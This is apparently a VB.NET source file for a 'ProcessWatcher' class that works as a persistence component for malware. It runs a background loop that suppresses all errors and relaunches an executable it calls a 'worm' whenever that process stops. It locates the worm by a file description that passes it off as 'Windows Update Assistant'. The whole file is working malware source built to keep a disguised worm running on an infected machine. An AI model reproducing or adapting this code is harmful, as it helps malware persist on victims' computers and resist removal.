Imports System.Diagnostics
Public Class ProcessWatcher
    Public st As Integer = 0
    Public trd As System.Threading.Thread
    Public Sub StartWatcher()
        trd = New System.Threading.Thread(Sub() WatcherDeamon(True))
        trd.IsBackground = True
        trd.Start()
    End Sub
    Private Sub WatcherDeamon(x As Boolean)
        On Error Resume Next
        Do While x = True
            If Not Process.GetProcessesByName(GetWorm()).Length > 0 Then
                System.Threading.Thread.Sleep(2500)
                Process.Start(Application.StartupPath & "\" & GetWorm() & ".exe")
            End If
        Loop
    End Sub
    Public Function GetWorm() As String
        Dim WormFile() As String = IO.Directory.GetFiles(Application.StartupPath)
        For Each file As String In WormFile
            Dim a As New IO.FileInfo(file)
            If FileVersionInfo.GetVersionInfo(a.FullName).FileDescription = "Windows Update Assistant" Then
                Return a.Name.Split(".")(0)
                Exit For
            End If
        Next
    End Function
End Class